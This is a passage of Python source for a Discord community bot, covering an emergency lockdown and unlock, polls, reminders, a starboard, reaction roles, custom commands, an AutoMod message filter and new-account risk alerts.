    settings = load("server_settings")
    gs = gdata(settings, ctx.guild.id)
    if gs.get("emergency_lockdown_backup"):
        return await ctx.send("⚠️ A lockdown backup already exists. Use `,emergencyunlock` to restore it first.")
    if str(confirm).lower() == "confirm":
        view = _EmergencyLockdownConfirmView(OWNER_ID, ctx.guild.id)
        return await ctx.send("🚨 **Emergency lockdown requested.** Confirm below to temporarily block @everyone from sending messages in text channels. This does not delete anything.", view=view)
    await ctx.send("Primary-owner emergency containment only. To open the confirmation: `,emergencylockdown confirm`.")


@bot.command(name="emergencyunlock")
@commands.guild_only()
async def _mikasa_emergencyunlock(ctx):
    if ctx.author.id != OWNER_ID:
        return await ctx.send("❌ Primary bot owner only. Co-owners cannot remove emergency containment.")
    settings = load("server_settings")
    gs = gdata(settings, ctx.guild.id)
    backup = gs.get("emergency_lockdown_backup")
    if not isinstance(backup, dict) or not backup:
        return await ctx.send("ℹ️ No saved emergency-lockdown backup was found for this server.")
    everyone = ctx.guild.default_role
    restored = 0
    failed = 0
    for channel_id, previous_value in list(backup.items()):
        channel = ctx.guild.get_channel(int(channel_id)) if str(channel_id).isdigit() else None
        if channel is None:
            continue
        try:
            overwrite = channel.overwrites_for(everyone)
            overwrite.send_messages = previous_value
            await channel.set_permissions(everyone, overwrite=overwrite, reason="Mikasa primary-owner emergency containment restore")
            restored += 1
        except Exception:
            failed += 1
    gs.pop("emergency_lockdown_backup", None)
    gs["emergency_lockdown_active"] = False
    save("server_settings", settings)
    await ctx.send(f"✅ Emergency containment restore finished. Restored **{restored}** channels; failed **{failed}**. Review channel permissions manually if any failed.")


# ═══════════════════════════════════════════════════════════════════════
# Paid-Bot feature merge (shop/order storefront intentionally excluded)
# Added only where Mikasa did not already have an equivalent command.
# ═══════════════════════════════════════════════════════════════════════

# Persistent, lightweight community features use Mikasa's existing JSON store.

def _pb_guild_store(store_name: str, guild_id: int) -> dict:
    raw = load(store_name)
    if not isinstance(raw, dict):
        raw = {}
    entry = raw.setdefault(str(guild_id), {})
    if not isinstance(entry, dict):
        entry = {}
        raw[str(guild_id)] = entry
    return raw


@bot.command(name="poll", aliases=["vote"])
@commands.guild_only()
@commands.cooldown(2, 10, commands.BucketType.user)
async def _pb_poll(ctx, *, poll_text: str = ""):
    """Create a reaction poll: ,poll Question | Option 1 | Option 2"""
    parts = [p.strip() for p in poll_text.split("|") if p.strip()]
    if not parts:
        return await ctx.send("Usage: `,poll Question | Option 1 | Option 2` (up to 10 options).")
    question, options = parts[0], parts[1:]
    if len(options) < 2:
        msg = await ctx.send(embed=discord.Embed(title="📊 " + question[:240], description="React with 👍 for Yes or 👎 for No.", color=COLORS["info"]))
        for emoji in ("👍", "👎"):
            try: await msg.add_reaction(emoji)
            except Exception: pass
        return
    if len(options) > 10:
        return await ctx.send("❌ A poll can have at most 10 options.")
    nums = ["1️⃣", "2️⃣", "3️⃣", "4️⃣", "5️⃣", "6️⃣", "7️⃣", "8️⃣", "9️⃣", "🔟"]
    embed = discord.Embed(title="📊 " + question[:240], color=COLORS["info"], timestamp=datetime.now(timezone.utc))
    embed.description = "\n".join(f"{nums[i]} {opt[:180]}" for i, opt in enumerate(options))
    embed.set_footer(text=f"Poll by {ctx.author.display_name} • React to vote")
    msg = await ctx.send(embed=embed)
    for emoji in nums[:len(options)]:
        try: await msg.add_reaction(emoji)
        except Exception: break


@bot.command(name="setsuggestchannel", aliases=["suggestchannel", "setsuggestions"])
@commands.guild_only()
@commands.has_guild_permissions(manage_guild=True)
async def _pb_set_suggest_channel(ctx, channel: discord.TextChannel):
    raw = _pb_guild_store("paidbot_suggestions", ctx.guild.id)
    raw[str(ctx.guild.id)] = {"channel_id": channel.id}
    save("paidbot_suggestions", raw)
    await ctx.send(f"✅ Suggestions will be posted in {channel.mention}.")


@bot.command(name="suggest", aliases=["suggestion"])
@commands.guild_only()
@commands.cooldown(2, 30, commands.BucketType.user)
async def _pb_suggest(ctx, *, suggestion: str = ""):
    if not suggestion.strip():
        return await ctx.send("Usage: `,suggest Your suggestion here`")
    settings = load("paidbot_suggestions")
    cfg = settings.get(str(ctx.guild.id), {}) if isinstance(settings, dict) else {}
    channel = ctx.guild.get_channel(int(cfg.get("channel_id", 0))) if cfg.get("channel_id") else None
    if channel is None:
        return await ctx.send("⚠️ Suggestions aren't configured yet. Ask an admin to use `,setsuggestchannel #channel`.")
    embed = discord.Embed(title="💡 Community Suggestion", description=suggestion[:3800], color=COLORS["info"], timestamp=datetime.now(timezone.utc))
    embed.set_author(name=str(ctx.author), icon_url=ctx.author.display_avatar.url)
    posted = await channel.send(embed=embed)
    for emoji in ("👍", "👎"):
        try: await posted.add_reaction(emoji)
        except Exception: pass
    try: await ctx.message.add_reaction("✅")
    except Exception: pass
    await ctx.send(f"✅ Your suggestion was submitted to {channel.mention}.", delete_after=8)


def _pb_parse_duration(value: str):
    matches = re.findall(r"(\d+)\s*(s|m|h|d|w)", (value or "").lower())
    if not matches or "".join(n + u for n, u in matches) == "":
        return None
    scale = {"s": 1, "m": 60, "h": 3600, "d": 86400, "w": 604800}
    total = sum(int(n) * scale[u] for n, u in matches)
    return total if 5 <= total <= 31536000 else None


@bot.command(name="remind", aliases=["reminder"])
@commands.guild_only()
@commands.cooldown(3, 15, commands.BucketType.user)
async def _pb_remind(ctx, duration: str = "", *, reminder_text: str = ""):
    seconds = _pb_parse_duration(duration)
    if seconds is None or not reminder_text.strip():
        return await ctx.send("Usage: `,remind 10m Drink water` (5 seconds to 1 year).")
    reminders = load("paidbot_reminders")
    if not isinstance(reminders, list): reminders = []
    reminders.append({"id": f"{ctx.guild.id}-{ctx.author.id}-{int(time.time()*1000)}", "guild_id": ctx.guild.id, "channel_id": ctx.channel.id, "user_id": ctx.author.id, "text": reminder_text[:1500], "due": time.time() + seconds, "sent": False})
    save("paidbot_reminders", reminders)
    await ctx.send(f"⏰ Reminder set for <t:{int(time.time()+seconds)}:R>.")


@tasks.loop(seconds=15)
async def _pb_reminder_worker():
    reminders = load("paidbot_reminders")
    if not isinstance(reminders, list) or not reminders: return
    changed = False
    for item in reminders:
        if not isinstance(item, dict) or item.get("sent") or float(item.get("due", 0)) > time.time(): continue
        item["sent"] = True
        changed = True
        try:
            channel = bot.get_channel(int(item.get("channel_id", 0)))
            if channel:
                await channel.send(f"⏰ <@{int(item.get('user_id', 0))}> — reminder: **{discord.utils.escape_markdown(str(item.get('text', '')))[:1500]}**")
            else:
                user = bot.get_user(int(item.get("user_id", 0)))
                if user: await user.send(f"⏰ Reminder: {item.get('text', '')}")
        except Exception as ex:
            print(f"[PaidBot reminder] delivery failed: {ex}")
    if changed: save("paidbot_reminders", reminders)


@bot.listen("on_ready")
async def _pb_start_reminder_worker():
    if not _pb_reminder_worker.is_running():
        _pb_reminder_worker.start()


@bot.command(name="setgoodbye", aliases=["goodbyesetup"])
@commands.guild_only()
@commands.has_guild_permissions(manage_guild=True)
async def _pb_set_goodbye(ctx, channel: discord.TextChannel = None):
    settings = load("paidbot_goodbye")
    if not isinstance(settings, dict): settings = {}
    if channel is None:
        settings.pop(str(ctx.guild.id), None)
        save("paidbot_goodbye", settings)
        return await ctx.send("✅ Goodbye messages disabled for this server.")
    settings[str(ctx.guild.id)] = {"channel_id": channel.id}
    save("paidbot_goodbye", settings)
    await ctx.send(f"✅ Goodbye messages will be sent to {channel.mention}.")


@bot.listen("on_member_remove")
async def _pb_goodbye_member(member: discord.Member):
    settings = load("paidbot_goodbye")
    cfg = settings.get(str(member.guild.id), {}) if isinstance(settings, dict) else {}
    channel = member.guild.get_channel(int(cfg.get("channel_id", 0))) if cfg.get("channel_id") else None
    if channel:
        try:
            await channel.send(embed=discord.Embed(description=f"👋 **{discord.utils.escape_markdown(member.display_name)}** has left the server.", color=COLORS["dark"]))
        except Exception: pass


@bot.command(name="starboard", aliases=["setstarboard"])
@commands.guild_only()
@commands.has_guild_permissions(manage_guild=True)
async def _pb_starboard_setup(ctx, channel: discord.TextChannel = None, threshold: int = 3):
    if channel is None:
        return await ctx.send("Usage: `,starboard #channel [threshold]` (default threshold: 3 stars).")
    if not 2 <= threshold <= 10:
        return await ctx.send("❌ Threshold must be between 2 and 10.")
    settings = load("paidbot_starboard")
    if not isinstance(settings, dict): settings = {}
    settings[str(ctx.guild.id)] = {"channel_id": channel.id, "threshold": threshold, "posted": {}}
    save("paidbot_starboard", settings)
    await ctx.send(f"⭐ Starboard enabled in {channel.mention} at **{threshold} ⭐**.")


@bot.listen("on_raw_reaction_add")
async def _pb_starboard_reaction(payload: discord.RawReactionActionEvent):
    if payload.guild_id is None or str(payload.emoji) not in ("⭐", "🌟") or (bot.user and payload.user_id == bot.user.id): return
    settings = load("paidbot_starboard")
    cfg = settings.get(str(payload.guild_id), {}) if isinstance(settings, dict) else {}
    if not cfg.get("channel_id"): return
    try:
        guild = bot.get_guild(payload.guild_id)
        source = guild.get_channel(payload.channel_id) if guild else None
        target = guild.get_channel(int(cfg["channel_id"])) if guild else None
        if not source or not target or source.id == target.id: return
        msg = await source.fetch_message(payload.message_id)
        if msg.author.bot: return
        reaction = next((r for r in msg.reactions if str(r.emoji) == str(payload.emoji)), None)
        if not reaction or reaction.count < int(cfg.get("threshold", 3)): return
        posted = cfg.setdefault("posted", {})
        if str(msg.id) in posted: return
        embed = discord.Embed(description=(msg.content or "*No text content*")[:3900], color=COLORS["warn"], timestamp=msg.created_at)
        embed.set_author(name=str(msg.author), icon_url=msg.author.display_avatar.url)
        embed.add_field(name="Source", value=f"[Jump to message]({msg.jump_url}) • {msg.channel.mention}", inline=False)
        if msg.attachments: embed.set_image(url=msg.attachments[0].url)
        board_msg = await target.send(embed=embed)
        posted[str(msg.id)] = {"channel_id": target.id, "message_id": board_msg.id}
        save("paidbot_starboard", settings)
    except Exception as ex:
        print(f"[PaidBot starboard] {ex}")


@bot.command(name="reactionrole", aliases=["rr"])
@commands.guild_only()
@commands.has_guild_permissions(manage_roles=True)
async def _pb_reaction_role_setup(ctx, message_id: str = "", emoji: str = "", role: discord.Role = None):
    if not message_id.isdigit() or not emoji or role is None:
        return await ctx.send("Usage: `,reactionrole MESSAGE_ID 😀 @Role` — add the chosen reaction to that message first.")
    if role >= ctx.guild.me.top_role:
        return await ctx.send("❌ I can't assign a role at or above my highest role.")
    try:
        message = await ctx.channel.fetch_message(int(message_id))
    except Exception:
        return await ctx.send("❌ I couldn't find that message in this channel. Run the command there.")
    settings = load("paidbot_reactionroles")
    if not isinstance(settings, dict): settings = {}
    items = settings.setdefault(str(ctx.guild.id), [])
    items.append({"channel_id": ctx.channel.id, "message_id": int(message_id), "emoji": emoji, "role_id": role.id})
    save("paidbot_reactionroles", settings)
    try: await message.add_reaction(emoji)
    except Exception: return await ctx.send("⚠️ Saved the mapping, but I couldn't add the reaction. Check emoji and permissions.")
    await ctx.send(f"✅ Reaction role set: {emoji} → {role.mention}.")


async def _pb_apply_reaction_role(payload, add: bool):
    if payload.guild_id is None or (bot.user and payload.user_id == bot.user.id): return
    settings = load("paidbot_reactionroles")
    items = settings.get(str(payload.guild_id), []) if isinstance(settings, dict) else []
    mapping = next((x for x in items if int(x.get("message_id", 0)) == payload.message_id and int(x.get("channel_id", 0)) == payload.channel_id and x.get("emoji") == str(payload.emoji)), None)
    if not mapping: return
    guild = bot.get_guild(payload.guild_id)
    if not guild: return
    member = guild.get_member(payload.user_id)
    role = guild.get_role(int(mapping.get("role_id", 0)))
    if not member or member.bot or not role or role >= guild.me.top_role: return
    try:
        if add: await member.add_roles(role, reason="Configured reaction role")
        else: await member.remove_roles(role, reason="Reaction role removed")
    except Exception as ex: print(f"[PaidBot reaction role] {ex}")


@bot.listen("on_raw_reaction_add")
async def _pb_reaction_role_add(payload):
    await _pb_apply_reaction_role(payload, True)


@bot.listen("on_raw_reaction_remove")
async def _pb_reaction_role_remove(payload):
    await _pb_apply_reaction_role(payload, False)


@bot.command(name="customcmd", aliases=["ccmd"])
@commands.guild_only()
@commands.has_guild_permissions(manage_guild=True)
async def _pb_custom_command(ctx, action: str = "list", *, details: str = ""):
    action = action.lower()
    data = load("paidbot_customcmds")
    if not isinstance(data, dict): data = {}
    guild_data = data.setdefault(str(ctx.guild.id), {})
    if action == "add":
        parts = [x.strip() for x in details.split("|", 1)]
        if len(parts) != 2 or not parts[0] or not parts[1]:
            return await ctx.send("Usage: `,customcmd add trigger | response text`")
        trigger = parts[0].lower().lstrip(PREFIX).strip()
        if len(trigger) > 32 or not re.fullmatch(r"[a-z0-9_-]+", trigger):
            return await ctx.send("❌ Trigger must be 1–32 letters, numbers, `_` or `-`.")
        if trigger in {"customcmd", "help", "poll", "suggest", "remind", "starboard", "reactionrole"}:
            return await ctx.send("❌ That trigger is reserved for a built-in command.")
        guild_data[trigger] = parts[1][:1800]
        save("paidbot_customcmds", data)
        return await ctx.send(f"✅ Custom command `,{trigger}` saved.")
    if action == "remove":
        trigger = details.strip().lower().lstrip(PREFIX)
        if guild_data.pop(trigger, None) is None:
            return await ctx.send("❌ I couldn't find that custom command.")
        save("paidbot_customcmds", data)
        return await ctx.send(f"✅ Removed `,{trigger}`.")
    if action == "list":
        names = sorted(guild_data)
        return await ctx.send("**Custom commands:** " + (", ".join(f"`,{n}`" for n in names) if names else "None yet. Add one with `,customcmd add trigger | response`."))
    await ctx.send("Actions: `,customcmd add trigger | response`, `,customcmd remove trigger`, `,customcmd list`.")


@bot.listen("on_message")
async def _pb_custom_command_listener(message: discord.Message):
    if not message.guild or message.author.bot or not message.content.startswith(PREFIX): return
    body = message.content[len(PREFIX):].strip()
    if not body: return
    trigger = body.split()[0].lower()
    data = load("paidbot_customcmds")
    guild_data = data.get(str(message.guild.id), {}) if isinstance(data, dict) else {}
    response = guild_data.get(trigger) if isinstance(guild_data, dict) else None
    if response:
        try: await message.channel.send(str(response)[:1900], allowed_mentions=discord.AllowedMentions.none())
        except Exception: pass


# Add the merged commands to Mikasa's existing help index where available.
try:
    _append_help_items("general", [
        (",poll Question | Option 1 | Option 2", "Create a reaction poll"),
        (",remind 10m message", "Set a persistent reminder"),
        (",suggest text", "Submit a community suggestion"),
        (",customcmd list", "List custom server commands"),
    ])
    _append_help_items("setup", [
        (",setsuggestchannel #channel", "Set the suggestion destination"),
        (",setgoodbye #channel", "Set or disable goodbye messages"),
        (",starboard #channel [threshold]", "Configure a starboard"),
        (",reactionrole MESSAGE_ID 😀 @Role", "Configure a reaction role"),
        (",customcmd add trigger | response", "Create a custom command"),
    ])
except Exception as _pb_help_error:
    print(f"[PaidBot merge] Help index update skipped: {_pb_help_error}")



# Paid-Bot AutoMod capabilities added to Mikasa's existing protection stack.
_PB_SPAM_TRACKER = defaultdict(list)

@bot.command(name="automod", aliases=["automodconfig"])
@commands.guild_only()
async def _pb_automod(ctx, action: str = "status", option: str = "", *, value: str = ""):
    if not (has_owner_access(ctx.author) or ctx.author.guild_permissions.manage_guild or ctx.author.guild_permissions.administrator):
        return await ctx.send("❌ You need Manage Server or Administrator to configure AutoMod.")
    action = (action or "status").lower()
    data = load("paidbot_automod")
    if not isinstance(data, dict): data = {}
    cfg = data.setdefault(str(ctx.guild.id), {"enabled": True, "caps": True, "invites": True, "badwords": True, "links": False, "mentions": True, "zalgo": True, "spam": True, "bad_words": [], "allowed_domains": [], "log_channel_id": None})
    if action in ("on", "enable"):
        cfg["enabled"] = True
    elif action in ("off", "disable"):
        cfg["enabled"] = False
    elif action in ("status", "show"):
        lines = [f"**{k.title()}:** {'On' if cfg.get(k) else 'Off'}" for k in ("enabled", "caps", "invites", "badwords", "links", "mentions", "zalgo", "spam")]
        lines += [f"**Bad-word entries:** {len(cfg.get('bad_words', []))}", f"**Allowed domains:** {len(cfg.get('allowed_domains', []))}"]
        return await ctx.send(embed=discord.Embed(title="🛡️ Mikasa AutoMod", description="\n".join(lines) + "\n\nToggle: `,automod toggle caps on`\nAdd word: `,automod addword phrase`\nAllow domain: `,automod allowdomain example.com`\nSet log: `,automod log #channel`", color=COLORS["info"]))
    elif action == "toggle":
        key = option.lower()
        if key not in ("caps", "invites", "badwords", "links", "mentions", "zalgo", "spam") or value.lower() not in ("on", "off"):
            return await ctx.send("Usage: `,automod toggle caps on|off` (caps, invites, badwords, links, mentions, zalgo, spam).")
        cfg[key] = value.lower() == "on"
    elif action == "addword":
        word = (" ".join(x for x in (option, value) if x)).strip().lower()
        if not word: return await ctx.send("Usage: `,automod addword phrase`")
        words = cfg.setdefault("bad_words", [])
        if word not in words: words.append(word[:100])
        cfg["badwords"] = True
    elif action == "removeword":
        word = (" ".join(x for x in (option, value) if x)).strip().lower()
        cfg["bad_words"] = [w for w in cfg.get("bad_words", []) if w != word]
    elif action == "allowdomain":
        domain = (option or value).lower().strip().replace("https://", "").replace("http://", "").split("/")[0].lstrip("www.")
        if not domain or "." not in domain: return await ctx.send("Usage: `,automod allowdomain example.com`")
        domains = cfg.setdefault("allowed_domains", [])
        if domain not in domains: domains.append(domain[:200])
        cfg["links"] = True
    elif action == "removedomain":
        domain = (option or value).lower().strip().replace("https://", "").replace("http://", "").split("/")[0].lstrip("www.")
        cfg["allowed_domains"] = [d for d in cfg.get("allowed_domains", []) if d != domain]
    elif action == "log" and option:
        channel = ctx.guild.get_channel(int(option.strip("<#>"))) if option.strip("<#>").isdigit() else None
        if not isinstance(channel, discord.TextChannel): return await ctx.send("Usage: `,automod log #channel`")
        cfg["log_channel_id"] = channel.id
    else:
        return await ctx.send("Actions: `status`, `on`, `off`, `toggle <filter> on|off`, `addword <phrase>`, `removeword <phrase>`, `allowdomain <domain>`, `removedomain <domain>`, `log #channel`.")
    data[str(ctx.guild.id)] = cfg
    save("paidbot_automod", data)
    await ctx.send(f"✅ AutoMod settings saved. Use `,automod status` to review.")


@bot.listen("on_message")
async def _pb_automod_message(message: discord.Message):
    if not message.guild or message.author.bot or not message.content or message.content.startswith(PREFIX): return
    if not isinstance(message.author, discord.Member): return
    member = message.author
    if member.id == OWNER_ID or member.guild_permissions.administrator or member.guild_permissions.manage_guild or member.guild_permissions.manage_messages: return
    data = load("paidbot_automod")
    cfg = data.get(str(message.guild.id), {}) if isinstance(data, dict) else {}
    if not cfg or not cfg.get("enabled", True): return
    content = message.content
    lower = content.lower()
    reason = None
    if cfg.get("invites", True) and re.search(r"(?:discord\.gg/|discord(?:app)?\.com/invite/)[\w-]+", lower):
        reason = "Discord invite links are not allowed"
    elif cfg.get("mentions", True) and (message.mention_everyone or len(message.mentions) + len(message.role_mentions) > 5):
        reason = "Mass mentions are not allowed"
    elif cfg.get("zalgo", True) and re.search(r"[\u0300-\u036f\u0489\u1dc0-\u1dff\u20d0-\u20ff\ufe20-\ufe2f]{3,}", content):
        reason = "Zalgo/glitch text is not allowed"
    elif cfg.get("caps", True) and len(content) >= 14:
        letters = re.sub(r"[^A-Za-z]", "", content)
        if len(letters) >= 10 and sum(c.isupper() for c in letters) / len(letters) > 0.78:
            reason = "Excessive capital letters are not allowed"
    elif cfg.get("badwords", True):
        for word in cfg.get("bad_words", []):
            if word and re.search(r"(?<!\w)" + re.escape(word) + r"(?!\w)", lower):
                reason = "A filtered word or phrase was detected"
                break
    if not reason and cfg.get("links", False):
        urls = re.findall(r"https?://[^\s<>]+", content, flags=re.I)
        for url in urls:
            try:
                host = re.sub(r"^www\.", "", re.match(r"https?://([^/:?#]+)", url, re.I).group(1).lower())
                allowed = cfg.get("allowed_domains", [])
                if not any(host == d or host.endswith("." + d) for d in allowed):
                    reason = "That link domain is not on the server allowlist"
                    break
            except Exception: pass
    if not reason and cfg.get("spam", True):
        key = (message.guild.id, member.id)
        now = time.time()
        recent = [t for t in _PB_SPAM_TRACKER[key] if now - t < 4]
        recent.append(now)
        _PB_SPAM_TRACKER[key] = recent
        if len(recent) >= 6: reason = "Message flooding is not allowed"
    if not reason: return
    try: await message.delete()
    except Exception: return
    notice = None
    try: notice = await message.channel.send(f"🛡️ {member.mention}, message removed: **{reason}**.", delete_after=7)
    except Exception: pass
    try:
        _gs_all = gdata(load("server_settings"), message.guild.id)
        log_id = _gs_all.get("mikasa_all_logs_channel") or cfg.get("log_channel_id")
    except Exception:
        log_id = cfg.get("log_channel_id")
    log_ch = message.guild.get_channel(int(log_id)) if str(log_id or "").isdigit() else None
    if log_ch:
        try:
            await log_ch.send(embed=discord.Embed(title="🛡️ AutoMod action", description=f"**Member:** {member.mention} (`{member.id}`)\n**Channel:** {message.channel.mention}\n**Reason:** {reason}\n**Content:** {(content[:700] or '[empty]').replace('```', '`\u200b``')}", color=COLORS["warn"]))
        except Exception: pass


async def main():
    loop = asyncio.get_event_loop()

    def _asyncio_handler(loop, context):
        try:
            exc = context.get("exception")
            msg = context.get("message", "")
            print(f"[asyncio] {msg}")
            if exc:
                print(f"[asyncio] exception: {exc!r}")
        except Exception:
            pass

    try:
        loop.set_exception_handler(_asyncio_handler)
    except Exception:
        pass

    async with bot:
        await setup()
        await bot.start(TOKEN)

# Final help-menu reconciliation for Paid-Bot features merged into Mikasa.
# This only updates the existing help index; it does not alter owner/application IDs.
try:
    _append_help_items("general", [
        (",poll Question | Option 1 | Option 2", "Create a reaction poll (up to 10 options)"),
        (",suggest Your idea", "Submit a community suggestion"),
        (",remind 10m Drink water", "Set a persistent reminder"),
        (",customcmd list", "List custom server commands"),
    ])
    _append_help_items("setup", [
        (",setsuggestchannel #channel", "Set the suggestion destination channel"),
        (",setgoodbye #channel", "Set the goodbye channel; omit channel to disable"),
        (",starboard #channel [threshold]", "Configure the starboard and star threshold"),
        (",reactionrole MESSAGE_ID 😀 @Role", "Bind a reaction on a message to a role"),
        (",customcmd add trigger | response", "Create a custom text-response command"),
        (",customcmd remove trigger", "Remove a custom command"),
        (",automod status", "View current AutoMod configuration"),
        (",automod on / off", "Enable or disable AutoMod"),
        (",automod toggle <filter> on|off", "Toggle caps, invites, bad words, links, mentions, zalgo or spam filters"),
        (",automod addword <phrase>", "Add a filtered word or phrase"),
        (",automod allowdomain example.com", "Allow a domain in link filtering"),
        (",automod log #channel", "Set AutoMod log channel"),
    ])
    _append_help_items("security", [
        (",automod status", "Review AutoMod protection settings"),
        (",automod toggle <filter> on|off", "Configure individual AutoMod filters (Manage Server/Admin)"),
    ])
    _append_help_items("logging", [
        (",starboard #channel [threshold]", "Set the channel and reaction threshold for starboard highlights"),
    ])
    _append_help_items("tickets", [
        (",ticket [reason]", "Open a support ticket"),
        (",ticketpanel [#channel] [title]", "Publish the ticket creation panel"),
        (",closeticket", "Close the current ticket"),
        (",adduser @member", "Add a member to the current ticket"),
        (",removeuser @member", "Remove a member from the current ticket"),
        (",tickets", "List open tickets (staff)"),
        (",ticketlog #channel", "Set the ticket transcript/log channel"),
        (",ticketrole @role", "Set the ticket support role"),
        (",ticketoption list", "List ticket types/options"),
        (",ticketoption add 😀 Label | description", "Configure a ticket type/option"),
    ])
    _append_help_items("giveaways", [
        (",giveaway <duration> <winners> <prize>", "Start a giveaway"),
        (",gend <message_id>", "End a giveaway early"),
        (",greroll <message_id>", "Reroll giveaway winner(s)"),
    ])
except Exception as _pb_help_reconcile_error:
    print(f"[PaidBot help reconciliation] {_pb_help_reconcile_error}")



# ─────────────────────────────────────────────────────────────────────────────
# SHINXHUB-INSPIRED ADDITIONS (Python-native; no premium or booster modules)
# Persistent anti-alt review, emoji mapping manager, setup health report, and
# persistent scheduled announcements. These complement existing Mikasa systems.
# ─────────────────────────────────────────────────────────────────────────────

_ANTI_ALT_DEFAULTS = {"enabled": True, "min_account_days": 3, "action": "alert", "log_channel_id": None, "quarantine_role_id": None}

def _anti_alt_config(guild_id: int) -> dict:
    all_cfg = load("anti_alt_settings")
    if not isinstance(all_cfg, dict): all_cfg = {}
    cfg = all_cfg.get(str(guild_id), {})
    if not isinstance(cfg, dict): cfg = {}
    merged = dict(_ANTI_ALT_DEFAULTS); merged.update(cfg)
    return merged

def _save_anti_alt_config(guild_id: int, cfg: dict) -> None:
    all_cfg = load("anti_alt_settings")
    if not isinstance(all_cfg, dict): all_cfg = {}
    all_cfg[str(guild_id)] = cfg
    save("anti_alt_settings", all_cfg)

@bot.command(name="antialt")
@commands.guild_only()
@commands.has_guild_permissions(manage_guild=True)
async def shinx_antialt(ctx, action: str = "status", value: str = None):
    """Configure new-account risk alerts. Default behavior is alert-only, never auto-ban."""
    cfg = _anti_alt_config(ctx.guild.id)
    action = action.lower()
    if action == "status":
        role = ctx.guild.get_role(int(cfg["quarantine_role_id"])) if str(cfg.get("quarantine_role_id") or "").isdigit() else None
        ch = ctx.guild.get_channel(int(cfg["log_channel_id"])) if str(cfg.get("log_channel_id") or "").isdigit() else None
        return await ctx.send(embed=discord.Embed(title="🛡️ Anti-Alt Risk Review", description=(
            f"**Enabled:** {'Yes' if cfg['enabled'] else 'No'}\n**Account-age threshold:** {cfg['min_account_days']} days\n"
            f"**Action:** {cfg.get('action','alert')} (safe default: alert only)\n**Log channel:** {ch.mention if ch else 'Not set'}\n"
            f"**Quarantine role:** {role.mention if role else 'Not set'}\n\n"
            f"Commands: `{PREFIX}antialt on|off`, `{PREFIX}antialt minage 7`, `{PREFIX}antialt log #channel`, `{PREFIX}antialt quarantine @role`, `{PREFIX}antialt action alert|quarantine`"
        ), color=COLORS["info"]))
    if action in ("on", "off"):
        cfg["enabled"] = action == "on"
    elif action == "minage":
        if not value or not value.isdigit() or not 0 <= int(value) <= 365:
            return await ctx.send("Use `,antialt minage 7` (0–365 days).")
        cfg["min_account_days"] = int(value)
    elif action == "log":
        if not value: return await ctx.send("Use `,antialt log #channel`.")
        raw = value.strip("<#>")
        channel = ctx.guild.get_channel(int(raw)) if raw.isdigit() else None
        if not isinstance(channel, discord.TextChannel): return await ctx.send("Please mention a text channel, e.g. `,antialt log #security-logs`.")
        cfg["log_channel_id"] = channel.id
    elif action == "quarantine":
        if not value: return await ctx.send("Use `,antialt quarantine @role`.")
        raw = value.strip("<@&>")
        role = ctx.guild.get_role(int(raw)) if raw.isdigit() else None
        if role is None: return await ctx.send("Please mention a valid quarantine role.")
        cfg["quarantine_role_id"] = role.id
    elif action == "action":
        if value not in ("alert", "quarantine"):
            return await ctx.send("Use `,antialt action alert` or `,antialt action quarantine`. Auto-ban is intentionally not offered.")
        if value == "quarantine" and not cfg.get("quarantine_role_id"):
            return await ctx.send("Set a quarantine role first: `,antialt quarantine @role`.")
        cfg["action"] = value
    else:
        return await ctx.send("Actions: `status`, `on`, `off`, `minage <days>`, `log #channel`, `quarantine @role`, `action alert|quarantine`.")
    _save_anti_alt_config(ctx.guild.id, cfg)
    await ctx.send("✅ Anti-alt settings saved. New-account checks are risk alerts, not proof that a member is malicious.")

@bot.listen("on_member_join")
async def _shinx_antialt_member_join(member: discord.Member):
    try:
        cfg = _anti_alt_config(member.guild.id)
        if not cfg.get("enabled", True): return
        age = (discord.utils.utcnow() - member.created_at).total_seconds() / 86400
        if age >= int(cfg.get("min_account_days", 3)): return
        try:
            _gs_all = gdata(load("server_settings"), member.guild.id)
            ch_id = _gs_all.get("mikasa_all_logs_channel") or cfg.get("log_channel_id")
        except Exception:
            ch_id = cfg.get("log_channel_id")
        ch = member.guild.get_channel(int(ch_id)) if str(ch_id or "").isdigit() else None
        if isinstance(ch, discord.TextChannel):
            await ch.send(embed=discord.Embed(
                title="⚠️ New Account Risk Alert",
                description=f"**Member:** {member.mention} (`{member.id}`)\n**Account age:** {max(0, age):.1f} days\n**Threshold:** {cfg.get('min_account_days',3)} days\n**Action:** {cfg.get('action','alert')}\n\nA young account is a risk signal only; review context before taking action.",
                color=COLORS["warn"]))
        if cfg.get("action") == "quarantine":
            rid = cfg.get("quarantine_role_id")
            role = member.guild.get_role(int(rid)) if str(rid or "").isdigit() else None
            me = member.guild.me
            if role and me and me.guild_permissions.manage_roles and role < me.top_role and not role.managed:
                await member.add_roles(role, reason="Configured anti-alt review: account younger than threshold")
    except Exception as exc:
        print(f"[anti-alt join review] {exc}")

# Custom emoji mappings are centrally stored and can be used by future panels.
def _emoji_map():
    data = load("custom_emoji_map")
    return data if isinstance(data, dict) else {}

@bot.command(name="emojilist")
@commands.guild_only()
async def shinx_emojilist(ctx):
    data = _emoji_map(); guild_data = data.get(str(ctx.guild.id), {})
    lines = [f"`{name}` → {value}" for name, value in sorted(guild_data.items())]
    text = "\n".join(lines[:40]) if lines else "No custom mappings configured. Use `,emojireplace name 😀`."
    await ctx.send(embed=discord.Embed(title="🎨 Custom Emoji Mappings", description=text[:4000], color=COLORS["info"]))

@bot.command(name="emojireplace")
@commands.guild_only()
@commands.has_guild_permissions(manage_guild=True)
async def shinx_emojireplace(ctx, name: str = None, *, emoji: str = None):
    if not name or not emoji: return await ctx.send("Use `,emojireplace name 😀` or `,emojireplace name <:custom:123456789>`.")
    if len(name) > 40 or len(emoji) > 100: return await ctx.send("Mapping name or emoji is too long.")
    data = _emoji_map(); guild_data = data.setdefault(str(ctx.guild.id), {})
    guild_data[name.lower()] = emoji
    save("custom_emoji_map", data)
    await ctx.send(f"✅ Mapping `{name.lower()}` saved as {emoji}. Existing hard-coded messages are not automatically rewritten.")

@bot.command(name="emojiinfo")
@commands.guild_only()
async def shinx_emojiinfo(ctx, name: str = None):
    if not name: return await ctx.send("Use `,emojiinfo name`.")
    value = _emoji_map().get(str(ctx.guild.id), {}).get(name.lower())
    await ctx.send(f"`{name.lower()}` → {value}" if value else f"No mapping found for `{name.lower()}`.")

@bot.command(name="emojireset")
@commands.guild_only()
@commands.has_guild_permissions(manage_guild=True)
async def shinx_emojireset(ctx, name: str = None):
    data = _emoji_map(); key = str(ctx.guild.id)
    if name:
        data.get(key, {}).pop(name.lower(), None)
    else:
        data.pop(key, None)
    save("custom_emoji_map", data)
